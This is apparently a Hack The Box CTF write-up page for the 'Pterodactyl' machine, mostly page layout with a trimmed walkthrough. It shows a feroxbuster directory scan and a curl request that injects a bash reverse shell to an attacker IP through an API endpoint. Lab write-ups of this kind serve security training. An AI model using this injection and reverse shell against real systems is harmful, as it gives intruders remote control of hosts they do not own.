---
layout: page
title: "Pterodactyl - Hack The Box Writeup"
subtitle: "Complete walkthrough detailing reconnaissance, foothold, and privilege escalation on 🐧 Linux"
permalink: /ctf/writeups/hackthebox/pterodactyl/
platform: hackthebox
machine_name: "Pterodactyl"
difficulty: Medium
os: Linux
---
...
<div class="htb-info-card">
  <div class="htb-card-header">
    <div class="htb-header-left">
      <img src="{{ page.avatar_url | default: ('/assets/images/machines/' | append: page.machine_name | downcase | replace: ' ', '-' | replace: '_', '-' | append: '.png') | relative_url }}" alt="Pterodactyl" class="htb-avatar-glow" onerror="this.src='{{ '/assets/images/logo.png' | relative_url }}';" />
      <div>
        <h3 class="htb-machine-title">Pterodactyl</h3>
  ...
  <div class="htb-meta-row" style="grid-template-columns: repeat(4, 1fr);">
    <div class="htb-meta-col">
      ...
      <span class="htb-meta-val green">17 Feb 2026</span>
    </div>
    <div class="htb-meta-col">
      <span class="htb-meta-label">IP Address</span>
      <span class="htb-meta-val" style="font-family: monospace; font-size: 0.95rem;">10.10.11.x</span>
    </div>
    <div class="htb-meta-col">
...
> [!NOTE]
> This writeup details the complete attack path for the **Pterodactyl** machine on the **HackTheBox** platform.
...
```bash
vulnquest@kali$ feroxbuster -u http://10.10.11.x/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
```
...
```bash
vulnquest@kali$ curl -X POST -d "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.51/443 0>&1'" http://10.10.11.x/api/action
```
